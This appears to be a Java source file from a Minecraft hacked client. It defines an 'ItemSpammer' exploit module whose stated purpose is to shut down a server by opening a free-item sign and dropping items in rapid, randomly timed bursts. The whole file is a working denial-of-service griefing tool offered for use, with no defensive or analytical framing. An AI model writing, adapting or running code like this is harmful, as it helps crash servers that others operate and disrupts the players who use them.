package com.ngames.nclient.module.modules.exploit;

import org.lwjgl.input.Keyboard;

import com.ngames.nclient.NClient;
import com.ngames.nclient.baritone.BUtils;
import com.ngames.nclient.baritone.Baritone;
import com.ngames.nclient.baritone.SafeThread;
import com.ngames.nclient.module.Category;
import com.ngames.nclient.module.Module;
import com.ngames.nclient.module.ModuleType;
import com.ngames.nclient.module.settings.SettingValue;

import net.minecraft.client.gui.inventory.GuiContainer;

@ModuleType(
		category = Category.EXPLOIT, 
		description = "Shutdown server with dropping items from free item sign", 
		name = "ItemSpammer", 
		words = "ItemSpammer exploit shutdown crash killer server",
		keyBind = Keyboard.KEY_NONE)
public class ItemSpammer extends Module
{
	private final SettingValue minDelay = new SettingValue("MinDelay", 35, 0, 86400000);
	private final SettingValue maxDelay = new SettingValue("MaxDelay", 40, 0, 86400000);
	private final SettingValue dropMinDelay = new SettingValue("MinDropDelay", 5, 0, 86400000);
	private final SettingValue dropMaxDelay = new SettingValue("MaxDropDelay", 8, 0, 86400000);
	
	public ItemSpammer()
	{
		this.settings = Module.addSettings(this);
	}
	
	@Override
	public void onEnable()
	{
		super.onEnable();
		new SafeThread (() ->
		{
			Baritone.rightClickMouse();
			while (!(NClient.MC.currentScreen instanceof GuiContainer) && this.enabled)
			{
				while (NClient.MC.world == null)
					BUtils.sleep(10);
				BUtils.sleep((long) BUtils.randomInRange(minDelay.getValue(), maxDelay.getValue()), BUtils.randomInRange(0, 999999));
				Baritone.rightClickMouse();
			}
			if (dropMaxDelay.getValue() == 0)
				Baritone.dropAllItems();
			else
				Baritone.dropAllItems(dropMinDelay.getValue(), dropMaxDelay.getValue());
			Baritone.closeInventory();
			while (NClient.MC.currentScreen instanceof GuiContainer && this.enabled)
			{
				BUtils.sleep(10);
			}
		}, this).start();
	}
}
